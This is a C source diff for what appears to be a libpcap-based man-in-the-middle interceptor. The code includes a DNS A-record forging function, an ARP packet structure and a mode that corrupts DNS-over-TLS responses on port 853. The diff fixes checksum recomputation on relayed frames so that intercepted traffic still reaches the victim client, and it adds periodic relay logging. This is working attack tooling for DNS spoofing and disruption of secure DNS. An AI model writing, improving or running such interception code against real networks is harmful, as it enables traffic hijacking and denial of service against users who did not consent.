@@ -99,12 +99,48 @@ static int forge_a(const uint8_t*dns,size_t dlen,uint8_t*out){
     return (int)c;
 }
 
-/* relay a frame to the client: rewrite MACs only (L3/L4 checksums stay valid) */
+/* Relay a frame to the client: rewrite MACs AND recompute IP/L4 checksums.
+ *
+ * The captured bytes cannot be trusted to already carry a valid TCP/UDP
+ * checksum: on a veth pair with checksum offload (the normal case on Linux /
+ * Docker bridges), the kernel marks the outgoing skb CHECKSUM_PARTIAL and
+ * leaves the real checksum to be filled in by the NIC/offload layer at
+ * actual transmission time. A raw AF_PACKET capture via libpcap sees the skb
+ * BEFORE that happens, so the checksum field it captures can be incomplete.
+ * Re-injecting those exact bytes on a different interface then produces a
+ * frame the receiving kernel silently drops at the TCP/UDP layer -- it is
+ * received cleanly at L2 (so link-level RX counters look fine) but never
+ * reaches the application, which looks exactly like "the relay isn't
+ * working" from the outside. Every other relay path in this program (and in
+ * the sibling interceptors) already recomputes checksums after editing a
+ * packet; this makes the "untouched" relay path do the same, since it is no
+ * longer literally the original frame once the Ethernet header changes. */
 static void relay_macs(const u_char*pkt,size_t caplen){
     uint8_t buf[MAX_PKT]; if(caplen>sizeof(buf)) return;
     memcpy(buf,pkt,caplen);
     struct ether_header*eth=(struct ether_header*)buf;
     memcpy(eth->ether_shost,g_amac,6); memcpy(eth->ether_dhost,g_cmac,6);
+
+    if(ntohs(eth->ether_type)==ETHERTYPE_IP &&
+       caplen>=sizeof(struct ether_header)+sizeof(struct iphdr)){
+        struct iphdr*ip=(struct iphdr*)(buf+sizeof(struct ether_header));
+        size_t ihl=ip->ihl*4;
+        size_t ip_total=ntohs(ip->tot_len);
+        if(ihl>=sizeof(struct iphdr) && ip_total>=ihl &&
+           sizeof(struct ether_header)+ip_total<=caplen){
+            ip->check=0; ip->check=checksum(ip,ihl);
+            uint8_t*l4=(uint8_t*)ip+ihl;
+            size_t l4len=ip_total-ihl;
+            if(ip->protocol==IPPROTO_TCP && l4len>=sizeof(struct tcphdr)){
+                struct tcphdr*th=(struct tcphdr*)l4;
+                th->check=0; th->check=l4_checksum(ip,IPPROTO_TCP,l4,l4len);
+            } else if(ip->protocol==IPPROTO_UDP && l4len>=sizeof(struct udphdr)){
+                struct udphdr*uh=(struct udphdr*)l4;
+                uh->check=0; uh->check=l4_checksum(ip,IPPROTO_UDP,l4,l4len);
+            }
+        }
+    }
+
     pcap_sendpacket(handle,buf,caplen);
 }
 
@@ -153,7 +189,7 @@ static void handler(u_char*u,const struct pcap_pkthdr*h,const u_char*pkt){
         relay_macs(pkt,h->caplen); return;
     }
 
-    /* ---- TCP/853 DoT: optionally corrupt (breaks TLS, cannot forge) ---- */
+        /* ---- TCP/853 DoT: optionally corrupt (breaks TLS, cannot forge) ---- */
     if(ip->protocol==IPPROTO_TCP && g_break){
         struct tcphdr*th=(struct tcphdr*)((uint8_t*)ip+ihl);
         if(ntohs(th->source)==853){
@@ -167,15 +203,28 @@ static void handler(u_char*u,const struct pcap_pkthdr*h,const u_char*pkt){
             struct tcphdr*bth=(struct tcphdr*)tcp; size_t doff=bth->doff*4;
             if(tcplen>doff){
                 tcp[tcplen-1]^=0xFF;
-                bth->check=0; bth->check=l4_checksum(bi,IPPROTO_TCP,tcp,tcplen);
                 printf("[BREAK-DoT] corrupted %zu-byte DoT record -> TLS will reject\n",tcplen-doff); fflush(stdout);
             }
+            /* Recompute IP + TCP checksums on EVERY relayed segment here, not
+             * just the ones actually corrupted above -- same reasoning as
+             * relay_macs(): the captured checksum cannot be trusted as-is
+             * under NIC/veth checksum offload, so bare SYN-ACKs/ACKs that
+             * pass through this branch untouched also need their checksums
+             * recomputed, or they get silently dropped by the client's
+             * kernel before the handshake ever reaches TLS at all. */
+            bi->check=0; bi->check=checksum(bi,ihl);
+            bth->check=0; bth->check=l4_checksum(bi,IPPROTO_TCP,tcp,tcplen);
             pcap_sendpacket(handle,buf,h->caplen); return;
         }
     }
 
-    /* ---- everything else: transparent relay ---- */
+    static unsigned long relay_count = 0;
     relay_macs(pkt,h->caplen);
+    if (++relay_count % 10 == 1) {  /* log every 10th to avoid flooding */
+        printf("[RELAY] passed through %lu packet(s) so far (last: proto=%d)\n",
+               relay_count, ip->protocol);
+        fflush(stdout);
+    }
 }
 
 struct arp_pkt{struct ether_header eth;uint16_t ht,pt;uint8_t hl,pl;uint16_t op;uint8_t sha[6],spa[4],tha[6],tpa[4];}__attribute__((packed));
